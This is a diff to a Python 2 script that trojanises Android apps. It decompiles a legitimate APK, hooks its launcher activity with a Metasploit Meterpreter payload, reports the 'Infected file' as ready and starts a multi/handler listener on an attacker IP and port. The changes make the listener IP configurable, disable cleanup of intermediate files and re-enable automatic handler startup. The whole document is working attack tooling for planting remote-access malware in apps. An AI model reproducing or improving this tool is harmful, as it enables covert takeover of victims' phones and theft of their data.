@@ -5,6 +5,7 @@ import sys
 import errno
 import os
 import shutil
+import time
 
 import xml.etree.ElementTree as ET
 
@@ -79,9 +80,12 @@ def generate_meterpreter(command):
         sys.exit(1)
 
 def start_meterpreter_handler():
-    command = "ifconfig wlan0 | grep \"inet \" | awk -F'[: ]+' '{ print $4 }'"
-    proc = subprocess.Popen(command, stdout=subprocess.PIPE,shell=True)
-    (localip, err) = proc.communicate()
+    # TODO option take local ip or given ip?
+    # TODO make inrerface dynamic
+    #command = "ifconfig wlan0 | grep \"inet \" | awk -F'[: ]+' '{ print $4 }'"
+    #proc = subprocess.Popen(command, stdout=subprocess.PIPE,shell=True)
+    #(localip, err) = proc.communicate()
+    localip = args['meterpreter_ip']
     print "[*] Start the handler for meterpreter on IP: " + str(localip) + " Port: " + args['meterpreter_port']
     with open("meterpreter_options.txt", "w") as f:
         f.write("use exploit/multi/handler\n")
@@ -111,8 +115,6 @@ def main():
 
     parseArgs()
     print args
-    start_meterpreter_handler()
-    exit(1)
 
     # check for used programs
     if args['metasploit_used']:
@@ -166,6 +168,7 @@ def main():
     smali_file = 'original/_decompiled/smali/{}.smali'.format(launcher_activity[0].replace(".", "/"))
 
     print smali_file
+    time.sleep(10)
 
     print "[*] Copying payload files..\n"
     hookedsmali = smali_converter.generate_hooked_smali(smali_file)
@@ -191,16 +194,16 @@ def main():
 
     # clean up
     print "[*] Clean up intermediate state ..\n"
-    shutil.rmtree('original/')
-    shutil.rmtree('payload/')
+    #shutil.rmtree('original/')
+    ##shutil.rmtree('payload/')
 
     os.remove("original.apk")
     os.remove("payload.apk")
     print "[+] Infected file " + injected_apk + " ready.\n"
 
      
-    #if args['metasploit_used']:
-    #    print "[*] Start the handler for meterpreter on IP: " + args['meterpreter_ip'] + " Port: " + args['meterpreter_port']
-    #    start_meterpreter_handler()
+    if args['metasploit_used']:
+        print "[*] Start the handler for meterpreter on IP: " + args['meterpreter_ip'] + " Port: " + args['meterpreter_port']
+        start_meterpreter_handler()
 
 main()
